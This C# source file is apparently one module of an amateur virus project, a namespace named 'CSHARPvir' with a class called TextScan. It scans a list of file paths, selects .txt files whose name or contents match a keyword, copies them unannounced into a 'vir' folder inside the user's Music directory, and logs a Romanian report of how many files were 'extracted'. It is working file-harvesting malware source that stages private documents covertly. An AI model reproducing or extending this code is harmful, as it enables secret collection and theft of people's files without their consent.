using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CSHARPvir
{
    //class used to get text files
    class TextScan:fprocess
    {
        String Key;
        int nof = 0;
        List<String> ftch;


        public TextScan(string key)
        {
            //key is the string that needed to be found in a text file or in it's name
            Key = key;
        }
        public override void work()
        {
            base.work();
            //ftch is a list of files that need to be copied
            ftch = new List<string>();
            foreach(var s in pth.fisiere)
            {
                ftch.Add(s);
            }

            List<int> to_rem = new List<int>();
            //check if files have .txt format
            for(int i=0;i<ftch.Count;i++)
            {
                if(Path.GetExtension(ftch[i])!=".txt")
               {
                    to_rem.Add(i);
                }
            }

            for(int i=0;i<to_rem.Count;i++)
            {
                ftch.RemoveAt(to_rem[i] - i);
            }

            to_rem.Clear();


            //checks if a file i from ftch has the key in it
            for(int i=0;i<ftch.Count;i++)
            {
                if(!ftch[i].Contains(Key))
                {
                    if (!System.IO.File.ReadAllText(ftch[i]).Contains(Key))
                    {
                        to_rem.Add(i);
                    }
                }

            }


            for (int i = 0; i < to_rem.Count; i++)
            {
                ftch.RemoveAt(to_rem[i] - i);
            }

            to_rem.Clear();


            nof = ftch.Count;
            //if vir folder does not exist this line creates it
            var f_path = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "/vir";
            System.IO.Directory.CreateDirectory(f_path);

            //moves found files to the vir folder
            foreach(string s in ftch)
                
            {
                System.IO.File.Copy(s,f_path+"/"+Path.GetFileName(s), true);
            }
            //writes a raport of files taken
            using (System.IO.StreamWriter file =
            new System.IO.StreamWriter(f_path+"/raport_txt.txt", true))
            {
                try
                {
                    file.WriteLine("numar fisiere extrase din: " + ftch[0] + "   " + nof.ToString());
                }
                catch
                {

                }
            }
        }



    }
}
